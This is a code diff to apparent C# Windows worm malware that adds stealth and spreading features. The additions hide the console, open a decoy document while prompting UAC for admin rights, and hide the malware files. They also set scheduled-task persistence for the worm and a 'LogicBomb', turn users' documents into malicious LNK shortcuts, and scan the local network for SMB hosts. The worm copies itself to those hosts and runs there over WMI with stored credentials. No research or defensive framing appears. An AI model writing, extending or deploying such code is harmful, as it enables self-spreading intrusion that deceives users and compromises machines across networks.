@@ -7,6 +7,7 @@ using System.Management;
 using System.Net.NetworkInformation;
 using System.Net.Sockets;
 using System.Runtime.InteropServices;
+using System.Security.Principal; // Required for Admin check
 using System.Threading;
 using System.Threading.Tasks;
 using AuthenticationLevel = System.Management.AuthenticationLevel;
@@ -31,38 +32,113 @@ class Program
 
     private const string WORM_TASK_NAME = "Malicious_Worm";
     private const string LOGICBOMB_TASK_NAME = "Malicious_LogicBomb";
-
     private static string logFilePath;
+
+    // --- STEALTH: Imports to hide the console window ---
+    [DllImport("kernel32.dll")]
+    static extern IntPtr GetConsoleWindow();
+
+    [DllImport("user32.dll")]
+    static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+
+    const int SW_HIDE = 0;
+    const int SW_SHOW = 5;
 
     static async Task Main(string[] args)
     {
+        // 1. Hide the console window immediately
+        var handle = GetConsoleWindow();
+        ShowWindow(handle, SW_HIDE);
+
         string baseDir = AppDomain.CurrentDomain.BaseDirectory;
+        Directory.SetCurrentDirectory(baseDir);
 
-        if (args.Length > 0)
-        {
-            try { Process.Start(args[0]); } catch { }
-        }
-
-        // --- MODIFIED: Change log file extension to .log ---
         string timestamp = DateTime.Now.ToString("ddMMyyyy_HHmmss");
         string logFileName = $"Worm_log_{timestamp}.log";
         logFilePath = Path.Combine(baseDir, logFileName);
 
+        // 2. Handle Decoy (If launched via LNK with arguments)
+        if (args.Length > 0)
+        {
+            string targetDoc = args[0];
+            if (System.IO.File.Exists(targetDoc))
+            {
+                try
+                {
+                    // Open the original document so the user thinks the shortcut worked
+                    Process.Start(new ProcessStartInfo(targetDoc) { UseShellExecute = true });
+                }
+                catch { }
+            }
+        }
+
+        // 3. Admin Privilege Check & Escalation
+        if (!IsAdministrator())
+        {
+            try
+            {
+                // Relaunch self with "runas" to trigger UAC
+                ProcessStartInfo proc = new ProcessStartInfo();
+                proc.UseShellExecute = true;
+                proc.WorkingDirectory = baseDir;
+                proc.FileName = Process.GetCurrentProcess().MainModule.FileName;
+                proc.Verb = "runas"; // This triggers the UAC prompt
+                // We do NOT pass args here, so the admin instance knows it's the payload runner, not the LNK handler
+
+                Process.Start(proc);
+
+                // Exit this non-admin instance. The user sees the doc open, and a UAC prompt.
+                // If they click Yes, the malware runs hidden as admin.
+                Environment.Exit(0);
+            }
+            catch
+            {
+                // If user clicks "No" on UAC, we stay in this process.
+                // We proceed with "Best Effort" execution (might fail persistence/logic bomb).
+                LogWarning("UAC denied. Running with limited privileges.");
+            }
+        }
+
+        // 4. Run the actual Malware Payload
+        await RunMalwarePayload(baseDir);
+    }
+
+    private static async Task RunMalwarePayload(string baseDir)
+    {
         LogToFile("========================================");
         LogToFile($"Worm started at {DateTime.Now:yyyy-MM-dd HH:mm:ss}");
         LogToFile($"Process ID: {Process.GetCurrentProcess().Id}");
+        LogToFile($"Privileges: {(IsAdministrator() ? "ADMIN" : "USER")}");
         LogToFile($"Running from: {baseDir}");
         LogToFile("========================================");
 
         try
         {
-            LogInfo("Staging disposable payload...");
-            StartLogicBombFromDuplicate();
+            // 0. Hide files immediately
+            LogInfo("[STEP 0] Applying file attributes (Hidden/System)...");
+            HideMalwareFiles(baseDir);
 
-            LogInfo("Attempting to install persistence...");
-            InstallPersistence();
+            // 1. Duplicate payload folder first (Staging)
+            LogInfo("[STEP 1] Staging disposable payload...");
+            string duplicateBombPath = CreateDuplicatePayload(baseDir);
 
-            LogInfo("Starting main loop (Infection & Propagation)...");
+            // 2. Install Persistence (Worm + Duplicated LogicBomb)
+            LogInfo("[STEP 2] Attempting to install persistence...");
+            InstallPersistence(duplicateBombPath);
+
+            // 3. Run the Local LogicBomb
+            LogInfo("[STEP 3] Executing LogicBomb...");
+            if (!string.IsNullOrEmpty(duplicateBombPath))
+            {
+                RunLogicBomb(duplicateBombPath);
+            }
+            else
+            {
+                LogWarning("Skipping LogicBomb execution because duplication failed.");
+            }
+
+            // 4. Begin Propagation Loop
+            LogInfo("[STEP 4] Starting main loop (Infection & Propagation)...");
             await ContinuousScanLoop();
         }
         catch (Exception ex)
@@ -72,43 +148,54 @@ class Program
         }
     }
 
-    private static void StartLogicBombFromDuplicate()
+    private static bool IsAdministrator()
+    {
+        var identity = WindowsIdentity.GetCurrent();
+        var principal = new WindowsPrincipal(identity);
+        return principal.IsInRole(WindowsBuiltInRole.Administrator);
+    }
+
+    // --- STEP 1: Duplicate the payload and return the path to the new EXE ---
+    private static string CreateDuplicatePayload(string baseDir)
     {
         try
         {
-            string baseDir = AppDomain.CurrentDomain.BaseDirectory;
             string originalPayloadPath = Path.Combine(baseDir, PAYLOAD_FOLDER_NAME);
 
             if (!Directory.Exists(originalPayloadPath))
             {
-                LogWarning($"Original payload folder not found at '{originalPayloadPath}'. Cannot start LogicBomb.");
-                return;
+                LogWarning($"Original payload folder not found at '{originalPayloadPath}'.");
+                return null;
             }
 
             string randomSuffix = new Random().Next(10000000, 99999999).ToString();
             string duplicatePayloadPath = Path.Combine(baseDir, $"{PAYLOAD_FOLDER_NAME}_{randomSuffix}");
 
-            LogInfo($"Creating disposable payload copy at: {Path.GetFileName(duplicatePayloadPath)}");
+            LogInfo($"Creating disposable payload copy at: {duplicatePayloadPath}");
             CopyFolderSync(originalPayloadPath, duplicatePayloadPath);
 
             string logicBombPath = Path.Combine(duplicatePayloadPath, LOGICBOMB_EXE_NAME);
+
             if (System.IO.File.Exists(logicBombPath))
             {
-                Process.Start(new ProcessStartInfo(logicBombPath) { UseShellExecute = true, CreateNoWindow = true, WindowStyle = ProcessWindowStyle.Hidden });
-                LogSuccess("LogicBomb started successfully from disposable copy.");
+                LogSuccess("Payload duplicated successfully.");
+                return logicBombPath;
             }
             else
             {
                 LogWarning($"LogicBomb.exe not found in duplicated payload folder.");
+                return null;
             }
         }
         catch (Exception ex)
         {
-            LogError($"Failed to start LogicBomb from duplicate: {ex.Message}");
+            LogError($"Failed to duplicate payload: {ex.Message}");
+            return null;
         }
     }
 
-    private static void InstallPersistence()
+    // --- STEP 2: Install Persistence for Worm AND the specific Duplicated Bomb ---
+    private static void InstallPersistence(string duplicateLogicBombPath)
     {
         try
         {
@@ -119,12 +206,89 @@ class Program
             }
             else
             {
-                LogWarning($"Failed to create Worm scheduled task. This is expected if not running as admin.");
+                LogWarning($"Failed to create Worm scheduled task (Likely requires Admin).");
+            }
+
+            if (!string.IsNullOrEmpty(duplicateLogicBombPath) && System.IO.File.Exists(duplicateLogicBombPath))
+            {
+                if (CreateScheduledTask(LOGICBOMB_TASK_NAME, duplicateLogicBombPath))
+                {
+                    LogSuccess($"LogicBomb persistence task created: {LOGICBOMB_TASK_NAME}");
+                    LogInfo($"Task points to: {duplicateLogicBombPath}");
+                }
+                else
+                {
+                    LogWarning($"Failed to create LogicBomb scheduled task.");
+                }
             }
         }
         catch (Exception ex)
         {
             LogError($"Persistence installation failed: {ex.Message}");
+        }
+    }
+
+    // --- STEP 3: Run the LogicBomb ---
+    private static void RunLogicBomb(string logicBombPath)
+    {
+        try
+        {
+            string workingDir = Path.GetDirectoryName(logicBombPath);
+
+            ProcessStartInfo psi = new ProcessStartInfo(logicBombPath)
+            {
+                UseShellExecute = false,
+                CreateNoWindow = true,
+                WindowStyle = ProcessWindowStyle.Hidden,
+                WorkingDirectory = workingDir
+            };
+            Process.Start(psi);
+            LogSuccess($"LogicBomb process started from: {Path.GetFileName(workingDir)}");
+        }
+        catch (Exception ex)
+        {
+            LogError($"Failed to run LogicBomb: {ex.Message}");
+        }
+    }
+
+    // --- MODIFIED: Hide ONLY malware files, ignore LNK/DOCs/etc ---
+    private static void HideMalwareFiles(string directory)
+    {
+        try
+        {
+            string[] filesToHide = {
+                WORM_EXE_NAME,
+                SHARED_CRYPTO_DLL,
+                "SharedCrypto.pdb"
+            };
+
+            foreach (string fileName in filesToHide)
+            {
+                string fullPath = Path.Combine(directory, fileName);
+                if (System.IO.File.Exists(fullPath))
+                {
+                    try { System.IO.File.SetAttributes(fullPath, FileAttributes.Hidden | FileAttributes.System); } catch { }
+                }
+            }
+
+            string payloadPath = Path.Combine(directory, PAYLOAD_FOLDER_NAME);
+            if (Directory.Exists(payloadPath))
+            {
+                DirectoryInfo payloadDir = new DirectoryInfo(payloadPath);
+                payloadDir.Attributes = FileAttributes.Hidden | FileAttributes.System;
+
+                foreach (var file in payloadDir.GetFiles("*", SearchOption.AllDirectories))
+                {
+                    string ext = file.Extension.ToLower();
+                    if (ext == ".log" || ext == ".txt") continue;
+
+                    try { System.IO.File.SetAttributes(file.FullName, FileAttributes.Hidden | FileAttributes.System); } catch { }
+                }
+            }
+        }
+        catch (Exception ex)
+        {
+            LogWarning($"Error hiding files: {ex.Message}");
         }
     }
 
@@ -181,11 +345,18 @@ class Program
                     LogInfo($"Local IP: {localIP}, Scanning network: {baseIP}.1 - {baseIP}.254");
 
                     List<string> smbHosts = await FindSmbServersAsync(baseIP);
-                    LogInfo($"Scan complete: Found {smbHosts.Count} SMB host(s) to infect.");
 
-                    foreach (string ip in smbHosts)
+                    if (smbHosts.Count > 0)
                     {
-                        await ProcessTargetHost(ip);
+                        LogSuccess($"Scan complete: Found {smbHosts.Count} SMB host(s) to infect.");
+                        foreach (string ip in smbHosts)
+                        {
+                            await ProcessTargetHost(ip);
+                        }
+                    }
+                    else
+                    {
+                        LogInfo("Scan complete: No active SMB hosts found this round.");
                     }
                 }
             }
@@ -201,7 +372,7 @@ class Program
 
     private static void InfectCurrentDirectoryWithLNKs()
     {
-        LogInfo("Scanning current directory to create/update LNK traps...");
+        LogInfo("Starting LNK trap generation in current directory...");
         try
         {
             string currentDir = AppDomain.CurrentDomain.BaseDirectory;
@@ -210,14 +381,27 @@ class Program
 
             var filesToInfect = Directory.GetFiles(currentDir)
                 .Where(f => targetExtensions.Contains(Path.GetExtension(f).ToLower()) &&
-                             // --- MODIFIED: Explicitly ignore our own log file ---
-                             !Path.GetFileName(f).Equals(Path.GetFileName(logFilePath), StringComparison.OrdinalIgnoreCase));
+                             !Path.GetFileName(f).Equals(Path.GetFileName(logFilePath), StringComparison.OrdinalIgnoreCase))
+                .ToList();
+
+            int totalCandidates = filesToInfect.Count;
+            if (totalCandidates == 0)
+            {
+                LogInfo("No suitable files found for LNK infection (docx, xlsx, txt, etc).");
+                return;
+            }
 
             int infectedCount = 0;
+            int skippedCount = 0;
+
             foreach (string filePath in filesToInfect)
             {
                 string lnkPath = filePath + ".lnk";
-                if (System.IO.File.Exists(lnkPath)) continue;
+                if (System.IO.File.Exists(lnkPath))
+                {
+                    skippedCount++;
+                    continue;
+                }
 
                 System.IO.File.SetAttributes(filePath, FileAttributes.Hidden);
 
@@ -229,14 +413,19 @@ class Program
                 shortcut.Save();
                 infectedCount++;
             }
+
             if (infectedCount > 0)
             {
-                LogSuccess($"Created {infectedCount} new LNK traps in the current directory.");
+                LogSuccess($"LNK Injection Summary: {infectedCount} new traps created, {skippedCount} already existed, {totalCandidates} total candidates.");
+            }
+            else
+            {
+                LogInfo($"LNK Injection Summary: All {totalCandidates} candidates were already infected.");
             }
         }
         catch (Exception ex)
         {
-            LogError($"Failed during LNK infection process: {ex.Message}");
+            LogWarning($"LNK infection process encountered an error: {ex.Message}");
         }
     }
 
@@ -268,8 +457,9 @@ class Program
             await CopyFolderAsync(localPackagePath, remoteShareUNC);
             LogSuccess($"Copied new worm package to {ip}");
 
-            string remoteWormExePath = Path.Combine(remoteShareUNC, WORM_EXE_NAME);
-            LogInfo($"Attempting to execute Worm remotely on {ip} via WMI...");
+            string remoteWormExePath = $@"C:\{SMB_SHARE_NAME}\{WORM_EXE_NAME}";
+
+            LogInfo($"Executing WMI command: {remoteWormExePath}");
             if (ExecuteRemoteCommandWMI(ip, SMB_USERNAME, SMB_PASSWORD, remoteWormExePath))
             {
                 LogSuccess($"Successfully propagated to {ip}");
@@ -313,11 +503,17 @@ class Program
         string originalBombPath = Path.Combine(basePayloadDir, ENCRYPTED_BOMB_NAME);
         string tempTrojanPath = Path.Combine(tempPackagePath, "Trojan.exe");
         string finalBombPath = Path.Combine(tempPayloadDir, ENCRYPTED_BOMB_NAME);
+        string keyFilePath = Path.Combine(tempPayloadDir, KEY_FILE_NAME);
+
+        if (System.IO.File.Exists(finalBombPath))
+            System.IO.File.SetAttributes(finalBombPath, FileAttributes.Normal);
+        if (System.IO.File.Exists(keyFilePath))
+            System.IO.File.SetAttributes(keyFilePath, FileAttributes.Normal);
 
         CryptoUtils.DecryptFile(originalBombPath, tempTrojanPath, oldKey);
         CryptoUtils.EncryptFile(tempTrojanPath, finalBombPath, newKey);
 
-        System.IO.File.WriteAllText(Path.Combine(tempPayloadDir, KEY_FILE_NAME), newKey);
+        System.IO.File.WriteAllText(keyFilePath, newKey);
 
         System.IO.File.Delete(tempTrojanPath);
     }
@@ -374,7 +570,7 @@ class Program
                     (ni.NetworkInterfaceType == NetworkInterfaceType.Ethernet ||
                      ni.NetworkInterfaceType == NetworkInterfaceType.Wireless80211))
                 {
-                    foreach (IPAddressInformation ip in ni.GetIPProperties().UnicastAddresses)
+                    foreach (UnicastIPAddressInformation ip in ni.GetIPProperties().UnicastAddresses)
                     {
                         if (ip.Address.AddressFamily == AddressFamily.InterNetwork)
                         {
@@ -383,12 +579,12 @@ class Program
                     }
                 }
             }
+            return null;
         }
-        catch (Exception ex)
+        catch
         {
-            LogError($"Could not get local IP address: {ex.Message}");
+            return null;
         }
-        return null;
     }
 
     private static bool ExecuteRemoteCommandWMI(string remoteIp, string username, string password, string commandToExecute)
@@ -409,7 +605,6 @@ class Program
         catch { return false; }
     }
 
-    #region Helper Methods
     private static void CopyFolderSync(string source, string dest)
     {
         Directory.CreateDirectory(dest);
@@ -432,7 +627,7 @@ class Program
             {
                 await Task.Run(() => System.IO.File.Copy(file, Path.Combine(dest, Path.GetFileName(file)), true));
             }
-            catch (Exception ex) { LogWarning($"Failed to copy {Path.GetFileName(file)}: {ex.Message}"); }
+            catch { }
         });
         var dirs = Directory.GetDirectories(source).Select(dir => CopyFolderAsync(dir, Path.Combine(dest, Path.GetFileName(dir))));
         await Task.WhenAll(files.Concat(dirs));
@@ -465,13 +660,11 @@ class Program
     private static void Log(string message, ConsoleColor color)
     {
         string prefix;
-        switch (color)
-        {
-            case ConsoleColor.Green: prefix = "[SUCCESS]"; break;
-            case ConsoleColor.Yellow: prefix = "[WARNING]"; break;
-            case ConsoleColor.Red: prefix = "[ERROR]"; break;
-            default: prefix = "[INFO]"; break;
-        }
+        if (color == ConsoleColor.Green) prefix = "[SUCCESS]";
+        else if (color == ConsoleColor.Yellow) prefix = "[WARNING]";
+        else if (color == ConsoleColor.Red) prefix = "[ERROR]";
+        else prefix = "[INFO]";
+
         string logMessage = $"{prefix} {message}";
         Console.ForegroundColor = color;
         Console.WriteLine(logMessage);
@@ -499,5 +692,4 @@ class Program
             default: return $"Error code {errorCode}";
         }
     }
-    #endregion
 }
